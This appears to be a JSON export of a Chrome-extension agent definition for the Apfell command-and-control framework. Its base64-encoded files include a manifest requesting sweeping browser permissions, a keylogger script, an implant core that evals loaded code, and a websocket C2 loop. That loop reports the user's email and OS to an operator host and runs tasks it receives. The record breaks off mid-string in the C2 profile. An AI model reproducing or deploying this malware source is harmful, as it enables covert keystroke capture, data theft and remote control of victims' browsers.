{
  "payload_types": [
    {
      "wrapper": false,
      "command_template": "command = function(task) {\n\t\/\/ code here\n};\nC2.commands[command.name] = command;\nCOMMAND_ENDS_HERE\n",
      "supported_os": "linux (x86),linux (x64),macOS (x86),macOS (x64),Windows (x86),Windows (x64)",
      "execute_help": "For more information on loading the crx file into Chrome or compiling the source code, please refer to this blog post: https:\/\/www.xorrior.com\/No-Place-Like-Chrome\/",
      "external": false,
      "container_running": true,
      "service": "rabbitmq",
      "author": "@xorrior",
      "note": "This payload uses javascript, html, and CSS for execution in the context of a browser. The extension code is compiled to work with Chrome but should be compatible with Brave as well. After creating a payload in Apfell, the result will be a zip file that contains a compiled crx file for the extension. It will also contain all of the source code so that you may make changes to the icon or update the extension and recompile.",
      "supports_dynamic_loading": true,
      "deleted": false,
      "last_heartbeat": "03\/20\/2020 01:12:50",
      "ptype": "chrome-extension",
      "file_extension": "js",
      "wrapped_payload_type": "null",
      "icon": null,
      "files": [
        {
          "manifest-template.json": "ewogICJuYW1lIjogIkVYVEVOU0lPTl9OQU1FX1JFUExBQ0UiLAogICJ2ZXJzaW9uIjogIlZFUlNJT05fUkVQTEFDRSIsCiAgIm1hbmlmZXN0X3ZlcnNpb24iOiAyLAogICJkZXNjcmlwdGlvbiI6ICJERVNDUklQVElPTl9SRVBMQUNFIiwKICAiaG9tZXBhZ2VfdXJsIjogImh0dHA6Ly93d3cuZXhhbXBsZS5jb20vZGVidWdleHRlbnNpb24iLAogICJjb250ZW50X3NlY3VyaXR5X3BvbGljeSI6ICJzY3JpcHQtc3JjICdzZWxmJyAndW5zYWZlLWV2YWwnOyBvYmplY3Qtc3JjICdzZWxmJyIsCiAgImNvbnZlcnRlZF9mcm9tX3VzZXJfc2NyaXB0IjogdHJ1ZSwKICAiYmFja2dyb3VuZCI6IHsKICAgICJzY3JpcHRzIjogWwogICAgICAibWFpbi5qcyIKICAgIF0sCiAgICAicGVyc2lzdGVudCI6IHRydWUKICB9LAogICJpY29ucyI6IHsKICAgICIxMjgiOiAiaWNvbnMvYmxhbmsucG5nIgogIH0sCiAgInVwZGF0ZV91cmwiIDogImh0dHA6Ly93d3cuZXhhbXBsZS5jb20vdXBkYXRlLnhtbCIsCiAgInBlcm1pc3Npb25zIjogWwogICAgImJvb2ttYXJrcyIsCiAgICAid2ViTmF2aWdhdGlvbiIsCiAgICAiY2xpcGJvYXJkUmVhZCIsCiAgICAiY2xpcGJvYXJkV3JpdGUiLAogICAgImNvbnRlbnRTZXR0aW5ncyIsCiAgICAiY29udGV4dE1lbnVzIiwKICAgICJjb29raWVzIiwKICAgICJoaXN0b3J5IiwKICAgICJpZGxlIiwKICAgICJtYW5hZ2VtZW50IiwKICAgICJub3RpZmljYXRpb25zIiwKICAgICJ0YWJzIiwKICAgICJpZGVudGl0eSIsCiAgICAiaWRlbnRpdHkuZW1haWwiLAogICAgImFsYXJtcyIsCiAgICAiYmFja2dyb3VuZCIsCiAgICAiYnJvd3NpbmdEYXRhIiwKICAgICJjb250ZW50U2V0dGluZ3MiLAogICAgImNvb2tpZXMiLAogICAgImRlYnVnZ2VyIiwKICAgICJkZWNsYXJhdGl2ZUNvbnRlbnQiLAogICAgImRlc2t0b3BDYXB0dXJlIiwKICAgICJkb3dubG9hZHMiLAogICAgImdjbSIsCiAgICAiaGlzdG9yeSIsCiAgICAiaWRsZSIsCiAgICAicG93ZXIiLAogICAgInByaXZhY3kiLAogICAgInByb3h5IiwKICAgICJzeXN0ZW0uY3B1IiwKICAgICJ0YWJDYXB0dXJlIiwKICAgICJ0YWJzIiwKICAgICJ1bmxpbWl0ZWRTdG9yYWdlIiwKICAgICJ3ZWJSZXF1ZXN0IiwKICAgICJuYXRpdmVNZXNzYWdpbmciLAogICAgImdlb2xvY2F0aW9uIiwKICAgICJ3ZWJSZXF1ZXN0QmxvY2tpbmciLAogICAgImRvd25sb2FkcyIsCiAgICAiZG93bmxvYWRzLm9wZW4iLAogICAgIjxhbGxfdXJscz4iCiAgXQp9Cg=="
        },
        {
          "extension\/utils\/kl.js": "Ly8gSGVhdmlseSBhZGFwdGVkIGZyb20gaHR0cHM6Ly9naXRodWIuY29tL1hlcm9kYXkvQ2hyb21lTG9nZ2VyL2Jsb2IvbWFzdGVyL0Nocm9tZS9zcmMvaW5qZWN0L3BheWxvYWQuanMKdmFyIHBvcnQgPSBjaHJvbWUucnVudGltZS5jb25uZWN0KHtuYW1lOiAia2V5bG9nZ2VyIn0pOwoKaWYgKCFkb2N1bWVudC50aXRsZSkgewogICAgZG9jdW1lbnQudGl0bGUgPSBkb2N1bWVudC5VUkw7Cn0KCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2tleXByZXNzJywgZnVuY3Rpb24oZSkgewogICAgZSA9IGUgfHwgd2luZG93LmV2ZW50OwogICAgdmFyIGNoYXJDb2RlID0gdHlwZW9mIGUud2hpY2ggPT0gIm51bWJlciIgPyBlLndoaWNoIDogZS5rZXlDb2RlOwogICAgaWYoY2hhckNvZGUpIHsKICAgICAgICBsb2coU3RyaW5nLmZyb21DaGFyQ29kZShjaGFyQ29kZSkpOwogICAgfQp9KTsKCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2tleWRvd24nLCBmdW5jdGlvbiAoZSkgewogICAgZSA9IGUgfHwgd2luZG93LmV2ZW50OwogICAgdmFyIGNoYXJDb2RlID0gdHlwZW9mIGUud2hpY2ggPT0gIm51bWJlciIgPyBlLndoaWNoIDogZS5rZXlDb2RlOwogICAgaWYgKGNoYXJDb2RlID09IDgpIHsKICAgICAgICBsb2coIltCS1NQXSIpOwogICAgfSBlbHNlIGlmIChjaGFyQ29kZSA9PSA5KSB7CiAgICAgICAgbG9nKCJbVEFCXSIpOwogICAgfSBlbHNlIGlmIChjaGFyQ29kZSA9PSAxMykgewogICAgICAgIGxvZygiW0VOVEVSXSIpOwogICAgfSBlbHNlIGlmIChjaGFyQ29kZSA9PSAxNikgewogICAgICAgIGxvZygiW1NISUZUXSIpOwogICAgfSBlbHNlIGlmIChjaGFyQ29kZSA9PSAxNykgewogICAgICAgIGxvZygiW0NUUkxdIik7CiAgICB9IGVsc2UgaWYgKGNoYXJDb2RlID09IDE4KSB7CiAgICAgICAgbG9nKCJbQUxUXSIpOwogICAgfSBlbHNlIGlmIChjaGFyQ29kZSA9PSA5MSkgewogICAgICAgIGxvZygiW0wgV0lORE9XXSIpOyAvLyBjb21tYW5kIGZvciBtYWMKICAgIH0gZWxzZSBpZiAoY2hhckNvZGUgPT0gOTIpIHsKICAgICAgICBsb2coIltSIFdJTkRPV10iKTsgLy8gY29tbWFuZCBmb3IgbWFjCiAgICB9IGVsc2UgaWYgKGNoYXJDb2RlID09IDkzKSB7CiAgICAgICAgbG9nKCJbU0VMRUNUL0NNRF0iKTsgLy8gY29tbWFuZCBmb3IgbWFjCiAgICB9Cn0pOwoKLyogS2V5bG9nIFNhdmluZyAqLwp2YXIgdGltZSA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpOwp2YXIgZGF0YSA9IHt9Owp2YXIgbGFzdExvZyA9IHRpbWU7CgoKZnVuY3Rpb24gbG9nKGlucHV0KSB7CiAgICB2YXIgbm93ID0gbmV3IERhdGUoKS5nZXRUaW1lKCk7CiAgICBpZiAobm93IC0gbGFzdExvZyA8IDEwKSByZXR1cm47CiAgICBkYXRhW3RpbWVdICs9IGlucHV0OwogICAgbGFzdExvZyA9IG5vdzsKICAgIHBvcnQuc2VuZE1lc3NhZ2UoZGF0YSkKfQ=="
        },
        {
          "extension\/icons\/blank.png": "iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGAAAActpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDUuNC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyI+CiAgICAgICAgIDx4bXA6Q3JlYXRvclRvb2w+QWRvYmUgSW1hZ2VSZWFkeTwveG1wOkNyZWF0b3JUb29sPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KKS7NPQAAATZJREFUeAHt0DEBAAAAwqD1T20MH4hAYcCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMG\/gMDAI8AAVgV38wAAAAASUVORK5CYII="
        },
        {
          "chrome-extension.js": "Ly8tLS0tLS0tLS0tLS0tLUlNUExBTlQgSU5GT1JNQVRJT04tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpjbGFzcyBpbXBsYW50ewogICAgY29uc3RydWN0b3IoKXsKICAgICAgICB0aGlzLmhvc3RpbmZvID0gImNocm9tZSI7CiAgICAgICAgdGhpcy51c2VyaW5mbyA9ICcnOwogICAgICAgIHRoaXMucHJvY2luZm8gPSAwOwogICAgICAgIHRoaXMudXVpZCA9ICJVVUlEX0hFUkUiOwogICAgICAgIHRoaXMuYXBmZWxsaWQgPSAwOwogICAgfQp9Cgp2YXIgaG9zdG9zID0gIiI7CnZhciBob3N0YXJjaCA9ICIiOwp2YXIgYXBmZWxsID0gbmV3IGltcGxhbnQoKTsKLy8tLS0tLS0tLS0tLS0tLUJhc2UgQzIgSU5GT1JNQVRJT04tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KY2xhc3MgYmFzZUMyIHsKICAgIGNvbnN0cnVjdG9yKGhvc3QsIHBvcnQsIGVuZHBvaW50LCBzc2wsIGludGVydmFsKSB7CiAgICAgICAgdGhpcy5ob3N0ID0gaG9zdDsKICAgICAgICB0aGlzLnBvcnQgPSBwb3J0OwogICAgICAgIHRoaXMucHJvdG8gPSAnJzsKICAgICAgICB0aGlzLmludGVydmFsID0gaW50ZXJ2YWw7CiAgICAgICAgdGhpcy5jb21tYW5kcyA9IHt9OwoKICAgICAgICBpZiAoc3NsID09PSB0cnVlKSB7CiAgICAgICAgICAgIHRoaXMucHJvdG8gPSAnd3NzOi8vJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICB0aGlzLnByb3RvID0gJ3dzOi8vJzsKICAgICAgICB9CiAgICAgICAgdGhpcy5zZXJ2ZXIgPSBgJHt0aGlzLnByb3RvfSR7dGhpcy5ob3N0fToke3RoaXMucG9ydH0vJHtlbmRwb2ludH1gOwogICAgfQoKICAgIGdldEludGVydmFsKCl7CiAgICAgICAgcmV0dXJuIHRoaXMuaW50ZXJ2YWw7CiAgICB9CgogICAgZ2V0Q29uZmlnKCl7CiAgICAgICAgLy8gcmV0dXJuIHRoZSBjMiBjb25maWcKICAgIH0KCiAgICBwb3N0UmVzcG9uc2UoKXsKICAgICAgICAvL291dHB1dCBhIHJlc3BvbnNlIHRvIGEgdGFzawogICAgfQogICAgc2V0Q29uZmlnKCl7CiAgICAgICAgLy9Ob3QgaW1wbGVtZW50ZWQKICAgIH0KICAgIGRvd25sb2FkKCl7CiAgICAgICAgLy9Ob3QgSW1wbGVtZW50ZWQKICAgIH0KICAgIHVwbG9hZCgpewogICAgICAgIC8vTm90IGltcGxlbWVudGVkCiAgICB9CgogICAgY2hlY2tJbigpewogICAgICAgIC8vIHJlZ2lzdGVyIHRoaXMgY2FsbGJhY2sgd2l0aCB0aGUgc2VydmVyCiAgICB9CgogICAgc2VuZFJlc3BvbnNlKCl7CiAgICAgICAgLy8gU2VuZCBhIHJlc3BvbnNlIHRvIHRoZSBzZXJ2ZXIKICAgIH0KfQoKLy8gQzIgUHJvZmlsZSBDb2RlCkMyUFJPRklMRV9IRVJFCgovLy0tLS0tLS0tLS0tLS1TSEFSRUQgQ09NTUFORCBDT0RFIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpjaHJvbWUuaWRlbnRpdHkuZ2V0UHJvZmlsZVVzZXJJbmZvKGZ1bmN0aW9uKGluZm8pewogICAgYXBmZWxsLnVzZXJpbmZvID0gaW5mby5lbWFpbDsKfSk7CgpjaHJvbWUucnVudGltZS5nZXRQbGF0Zm9ybUluZm8oZnVuY3Rpb24oaW5mbykgewogICAgaG9zdG9zID0gaW5mby5vczsKICAgIGhvc3RhcmNoID0gaW5mby5hcmNoOwp9KTsKCmRlZmF1bHRfbG9hZCA9IGZ1bmN0aW9uKGNvbnRlbnRzKXsKICAgIHZhciBtb2R1bGUgPSB7ZXhwb3J0czoge319OwogICAgdmFyIGV4cG9ydHMgPSBtb2R1bGUuZXhwb3J0czsKICAgIGV2YWwoY29udGVudHMpOwogICAgcmV0dXJuIG1vZHVsZS5leHBvcnRzOwp9OwoKbGV0IGV4cG9ydHMgPSB7fTsKLy8gQ29tbWFuZHMKQ09NTUFORFNfSEVSRQoKdmFyIGNvbW1hbmRzX2RpY3QgPSBleHBvcnRzOwpDMi5jb21tYW5kcyA9IE9iamVjdC5rZXlzKGNvbW1hbmRzX2RpY3QpOw=="
        }
      ],
      "support_scripts": [
        {
          "name": "create_table",
          "script": "ZnVuY3Rpb24oaGVhZGVycywgZGF0YSl7CiAgdmFyIG91dHB1dCA9ICI8dGFibGUgc3R5bGU9J292ZXJmbG93OnNjcm9sbDt3aGl0ZS1zcGFjZTpub3dyYXA7d2lkdGg6MTAwJTtjb2xvcjp3aGl0ZScgY2xhc3M9J3RhYmxlLXN0cmlwZWQgdGFibGUtaG92ZXIgYm9yZGVyIGJvcmRlci1kYXJrIHNoYWRvdyB0YWJsZS1jb25kZW5zZWQgdGFibGUtZGFyayc+IjsKICBvdXRwdXQgKz0gIjx0cj4iOwogIGZvcih2YXIgaSA9IDA7IGkgPCBoZWFkZXJzLmxlbmd0aDsgaSsrKXsKICAgIG91dHB1dCArPSAiPHRoIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiMzOTM0ODU7Y29sb3I6d2hpdGU7aGVpZ2h0OjQwcHg7dGV4dC1hbGlnbjpsZWZ0O3BhZGRpbmc6MHB4IDBweCAwcHggMjBweDt3aWR0aDoiICsgaGVhZGVyc1tpXVsnc2l6ZSddICsgIicgb25jbGljaz1cInNvcnRfdGFibGUodGhpcylcIj4iICsgaGVhZGVyc1tpXVsnbmFtZSddLnRvVXBwZXJDYXNlKCkgKyAiPC90aD4iOwogIH0KICBvdXRwdXQgKz0gIjwvdHI+IjsKICBmb3IodmFyIGkgPSAwOyBpIDwgZGF0YS5sZW5ndGg7IGkrKyl7CiAgICBvdXRwdXQgKz0gIjx0ciBzdHlsZT0ndGV4dC1hbGlnbjpsZWZ0OyIgKyBkYXRhW2ldWydyb3ctc3R5bGUnXSArICInPiI7CiAgICBmb3IodmFyIGogPSAwOyBqIDwgaGVhZGVycy5sZW5ndGg7IGorKyl7CiAgICAgaWYoZGF0YVtpXVsnY2VsbC1zdHlsZSddLmhhc093blByb3BlcnR5KGhlYWRlcnNbal0pKXsKICAgICAgICBvdXRwdXQgKz0gIjx0ZCBzdHlsZT0ncGFkZGluZzowcHggMHB4IDBweCAyMHB4OyIgKyBkYXRhW2ldWydjZWxsLXN0eWxlJ11baGVhZGVyc1tqXVsnbmFtZSddXSArICInPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgICBlbHNlewogICAgICAgIG91dHB1dCArPSAiPHRkIHN0eWxlPSdwYWRkaW5nOjBweCAwcHggMHB4IDIwcHgnPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgIH0KICAgIG91dHB1dCArPSAiPC90cj4iOwogIH0KICBvdXRwdXQgKz0gIjwvdGFibGU+IjsKICByZXR1cm4gb3V0cHV0Owp9"
        },
        {
          "name": "collapsable",
          "script": "ZnVuY3Rpb24oaGVhZGVyLCBlbGVtZW50LCB1bmlxdWVfaWQpewoJLy90YWtlcyBpbiBpbmZvcm1hdGlvbiBhYm91dCB0aGUgaGVhZGVyIHRvIG1ha2UgYW5kIHRoZSBlbGVtZW50IHRvIGNvbGxhcHNlIHdpdGhpbiBpdCAoYXMgYSBzdHJpbmcpCgl2YXIgb3V0cHV0ID0gIjxkaXYgY2xhc3M9J2NhcmQnPjxkaXYgY2xhc3M9J2NhcmQtaGVhZGVyIGJvcmRlciBib3JkZXItZGFyayBzaGFkb3cnPjxhIGNsYXNzPSdidG4nIHR5cGU9J2J1dHRvbicgZGF0YS10b2dnbGU9J2NvbGxhcHNlJyBkYXRhLXRhcmdldD0nI2JzdGFzayIgKyB1bmlxdWVfaWQgKyAiJyBhcmlhLWV4cGFuZGVkPSdmYWxzZScgYXJpYS1jb250cm9scz0nYnN0YXNrIiArIHVuaXF1ZV9pZCArICInPiIrIGhlYWRlclsnbmFtZSddICsgIjwvYT48L2Rpdj4iOwogICAgICBvdXRwdXQgKz0gIjxkaXYgY2xhc3M9J2NvbGxhcHNlJyBpZD1cImJzdGFzayIgKyB1bmlxdWVfaWQgKyAiXCIgc3R5bGU9J3dpZHRoOjEwMCUnPiI7CiAgICAgIG91dHB1dCArPSAiPGRpdiBjbGFzcz0nYmctY2FyZC1ib2R5LWwyIGNhcmQtYm9keSBib3JkZXIgYm9yZGVyLWRhcmsgc2hhZG93Jz4iICsgZWxlbWVudCArICI8L2Rpdj48L2Rpdj48L2Rpdj4iOwogIHJldHVybiBvdXRwdXQ7Cn0="
        }
      ],
      "c2_profiles": {
        "chrome-server": [
          {
            "chrome-server.js": "Ly8tLS0tLS0tLS0tLS0tIENocm9tZSBFeHRlbnNpb24gV2Vic29ja2V0IEMyIG1lY2hhbmlzbXMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi8vIERpY3Rpb25hcnkgdGhhdCBob2xkcyBvdXRib3VuZCBtZXNzYWdlcwp2YXIgb3V0ID0gW107CmxldCBzY3JlZW5jYXB0dXJlcyA9IFtdOwpsZXQgbG9nZ2VyID0gIiI7CmxldCBsb2FkcyA9IFtdOwpjbGFzcyBjdXN0b21DMiBleHRlbmRzIGJhc2VDMnsKICAgIGNvbnN0cnVjdG9yKGhvc3QsIHBvcnQsIGVuZHBvaW50LCBzc2wgLCBpbnRlcnZhbCl7CiAgICAgICAgc3VwZXIoaG9zdCwgcG9ydCwgZW5kcG9pbnQsIHNzbCwgaW50ZXJ2YWwpOwogICAgICAgIHRoaXMuaG9zdCA9IGhvc3Q7CiAgICAgICAgdGhpcy5wb3J0ID0gcG9ydDsKICAgICAgICB0aGlzLmVuZHBvaW50ID0gZW5kcG9pbnQ7CiAgICAgICAgdGhpcy5pbnRlcnZhbCA9IGludGVydmFsOwogICAgICAgIHRoaXMuY29tbWFuZHMgPSB7fTsKCiAgICAgICAgaWYgKHNzbCA9PT0gdHJ1ZSl7CiAgICAgICAgICAgIHRoaXMucHJvdG8gPSAnd3NzOi8vJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICB0aGlzLnByb3RvID0gJ3dzOi8vJzsKICAgICAgICB9CgogICAgICAgIHRoaXMuc2VydmVyID0gYCR7dGhpcy5wcm90b30ke3RoaXMuaG9zdH06JHt0aGlzLnBvcnR9LyR7dGhpcy5lbmRwb2ludH1gOwogICAgfQoKICAgIGdldENvbmZpZygpIHsKICAgICAgICByZXR1cm4gSlNPTi5zdHJpbmdpZnkoeydzZXJ2ZXInOiB0aGlzLnNlcnZlciwgJ2ludGVydmFsJzp0aGlzLmludGVydmFsLCAnY29tbWFuZHMnOiBKU09OLnN0cmluZ2lmeSh0aGlzLmNvbW1hbmRzKX0pOwogICAgfQoKICAgIGNoZWNrSW4oKSB7CiAgICAgICAgY29uc3QgbXNnID0gewogICAgICAgICAgICAiYWN0aW9uIjoiY2hlY2tpbiIsCiAgICAgICAgICAgICJvcyI6aG9zdG9zLAogICAgICAgICAgICAiYXJjaGl0ZWN0dXJlIjogaG9zdGFyY2gsCiAgICAgICAgICAgICJ1c2VyIjphcGZlbGwudXNlcmluZm8sCiAgICAgICAgICAgICJ1dWlkIjphcGZlbGwudXVpZCwKICAgICAgICAgICAgImhvc3QiOmFwZmVsbC51c2VyaW5mbyArICIncyBjaHJvbWUiLAogICAgICAgICAgICAicGlkIjowLAogICAgICAgICAgICAiaXAiOicxMjcuMC4wLjEnLAogICAgICAgIH07CgogICAgICAgIGxldCBjaGVja2luID0gSlNPTi5zdHJpbmdpZnkobXNnKTsKICAgICAgICBsZXQgY2hlY2tpbnBheWxvYWQgPSBhcGZlbGwudXVpZCArIGNoZWNraW47CgogICAgICAgIGNvbnN0IG1ldGEgPSB7CiAgICAgICAgICAgICJjbGllbnQiOiB0cnVlLAogICAgICAgICAgICAiZGF0YSI6IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGNoZWNraW5wYXlsb2FkKSkpLAogICAgICAgICAgICAidGFnIjoiIiwKICAgICAgICB9OwoKICAgICAgICBjb25zdCBlbmNtc2cgPSBKU09OLnN0cmluZ2lmeShtZXRhKTsKICAgICAgICBjb25uZWN0aW9uLnNlbmQoZW5jbXNnKTsKICAgICAgICAvL2NvbnNvbGUubG9nKCdTZW50IGluaXRpYWwgY2hlY2tpbicpOwogICAgfQoKICAgIHBvc3RSZXNwb25zZSgpewogICAgICAgIGlmIChvdXQubGVuZ3RoID4gMCl7CiAgICAgICAgICAgIC8vIFBvcCBhbmQgc2VuZCBhIG1lc3NhZ2UgdG8gdGhlIGNvbnRyb2xsZXIKICAgICAgICAgICAgd2hpbGUgKG91dC5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICBjb25zdCBtc2cgPSBvdXQuc2hpZnQoKTsKICAgICAgICAgICAgICAgIGNvbnN0IG1ldGEgPSB7CiAgICAgICAgICAgICAgICAgICAgImNsaWVudCI6dHJ1ZSwKICAgICAgICAgICAgICAgICAgICAiZGF0YSI6IG1zZywKICAgICAgICAgICAgICAgICAgICAidGFnIjoiIgogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgIGxldCBmaW5hbCA9IEpTT04uc3RyaW5naWZ5KG1ldGEpOwogICAgICAgICAgICAgICAgY29ubmVjdGlvbi5zZW5kKGZpbmFsKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKLy8tLS0tLS0tLS0tLS0tIElOU1RBTlRJQVRFIE9VUiBDMiBDTEFTUyBCRUxPVyBIRVJFIElOIE1BSU4gQ09ERS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmNvbnN0IEMyID0gbmV3IGN1c3RvbUMyKCdIT1NUX1JFUExBQ0UnLCAgUE9SVF9SRVBMQUNFLCAnd2Vic29ja2V0JywgU1NMX1JFUExBQ0UsIElOVEVSVkFMX1JFUExBQ0UpOwpjb25zdCBjb25uZWN0aW9uICA9IG5ldyBXZWJTb2NrZXQoYCR7QzIuc2VydmVyfWApOwoKZnVuY3Rpb24gY2h1bmtBcnJheShhcnJheSwgc2l6ZSkgewogICAgaWYoYXJyYXkubGVuZ3RoIDw9IHNpemUpewogICAgICAgIHJldHVybiBbYXJyYXldOwogICAgfQoKICAgIHJldHVybiBbYXJyYXkuc2xpY2UoMCxzaXplKSwgLi4uY2h1bmtBcnJheShhcnJheS5zbGljZShzaXplKSwgc2l6ZSldOwp9CgpmdW5jdGlvbiBjMmxvb3AoKSB7CiAgICBDMi5wb3N0UmVzcG9uc2UoKTsKICAgIGlmIChhcGZlbGwuYXBmZWxsaWQubGVuZ3RoICE9PSAwKSB7CiAgICAgICAgbGV0IHJlcXVlc3QgPSB7J2FjdGlvbic6J2dldF90YXNraW5nJywgJ3Rhc2tpbmdfc2l6ZSc6IC0xLCAnZGVsZWdhdGVzJzpbXX07CiAgICAgICAgbGV0IG1zZyA9IEpTT04uc3RyaW5naWZ5KHJlcXVlc3QpOwogICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIG1zZzsKICAgICAgICBsZXQgZW5jZmluYWwgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICBvdXQucHVzaChlbmNmaW5hbCk7CiAgICB9IGVsc2UgewogICAgICAgIC8vY29uc29sZS5sb2coJ0FwZmVsbCBpZCBub3Qgc2V0IGZvciB0YXNraW5nICcgKyBhcGZlbGwuYXBmZWxsaWQpOwogICAgfQp9Cgp2YXIgbWFpbmxvb3AgPSBzZXRJbnRlcnZhbChjMmxvb3AsIEMyLmludGVydmFsICogMTAwMCk7Cgpjb25uZWN0aW9uLm9ub3BlbiA9IGZ1bmN0aW9uICgpIHsKICAgIEMyLmNoZWNrSW4oKTsKfTsKCmNvbm5lY3Rpb24ub25jbG9zZSA9IGZ1bmN0aW9uICgpIHsKICAgIC8vIERvIE5vdGhpbmcKfTsKCmNvbm5lY3Rpb24ub25lcnJvciA9IGZ1bmN0aW9uICgpIHsKICAgIC8vIERvIE5vdGhpbmcKfTsKCmNvbm5lY3Rpb24ub25tZXNzYWdlID0gZnVuY3Rpb24gKGUpIHsKICAgIGNvbnN0IHJhd21zZyA9IEpTT04ucGFyc2UoZS5kYXRhKTsKICAgIGNvbnN0IGRlY29kZWQgPSBhdG9iKHJhd21zZy5kYXRhKTsKICAgIGNvbnN0IG1lc3NhZ2Vub3V1aWQgPSBkZWNvZGVkLnNsaWNlKDM2LCBkZWNvZGVkLmxlbmd0aCk7CgogICAgY29uc3QgbWVzc2FnZSA9IEpTT04ucGFyc2UobWVzc2FnZW5vdXVpZCk7CiAgICBzd2l0Y2ggKG1lc3NhZ2UuYWN0aW9uKSB7CiAgICAgICAgY2FzZSAnY2hlY2tpbic6IHsKICAgICAgICAgICAgLy8gY2FsbGJhY2sgY2hlY2sgaW4KICAgICAgICAgICAgYXBmZWxsLmFwZmVsbGlkID0gbWVzc2FnZS5pZDsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgIGNhc2UgJ2dldF90YXNraW5nJyA6IHsKICAgICAgICAgICAgLy8gaGFuZGxlIGFuIGFwZmVsbCBtZXNzYWdlCgogICAgICAgICAgICBmb3IgKGxldCBpbmRleCA9IDA7IGluZGV4IDwgbWVzc2FnZS50YXNrcy5sZW5ndGg7IGluZGV4KyspIHsKICAgICAgICAgICAgICAgIGNvbnN0IHRhc2sgPSBtZXNzYWdlLnRhc2tzW2luZGV4XTsKCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGNvbW1hbmRzX2RpY3RbdGFzay5jb21tYW5kXSh0YXNrKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgbGV0IHJlc3BvbnNlID0geyd0YXNrX2lkJzp0YXNrLmlkLCAnY29tcGxldGVkJzpmYWxzZSwgJ3N0YXR1cyc6J2Vycm9yJywgJ2Vycm9yJzonZXJyb3IgcHJvY2Vzc2luZyB0YXNrIGZvciBpZCAnICsgdGFzay5pZCArICdcbicgKyBlcnJvci50b1N0cmluZygpfTsKICAgICAgICAgICAgICAgICAgICBsZXQgb3V0ZXJfcmVzcG9uc2UgPSB7J2FjdGlvbic6J3Bvc3RfcmVzcG9uc2UnLCdyZXNwb25zZXMnOltyZXNwb25zZV0sICdkZWxlZ2F0ZXMnOltdfTsKICAgICAgICAgICAgICAgICAgICBsZXQgbXNnID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoYXBmZWxsLmFwZmVsbGlkICsgSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpKSkpOwogICAgICAgICAgICAgICAgICAgIG91dC5wdXNoKG1zZyk7CiAgICAgICAgICAgICAgICAgICAgLy9jb25zb2xlLmxvZygiRXJyb3IgZXhlY3V0aW5nIHRhc2s6ICIgKyBlcnJvci50b1N0cmluZygpKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgIGNhc2UgJ3Bvc3RfcmVzcG9uc2UnIDogewogICAgICAgICAgICBmb3IgKGxldCBpbmRleCA9IDA7IGluZGV4IDwgbWVzc2FnZS5yZXNwb25zZXMubGVuZ3RoOyBpbmRleCsrKSB7CiAgICAgICAgICAgICAgICBsZXQgcmVzcG9uc2UgPSBtZXNzYWdlLnJlc3BvbnNlc1tpbm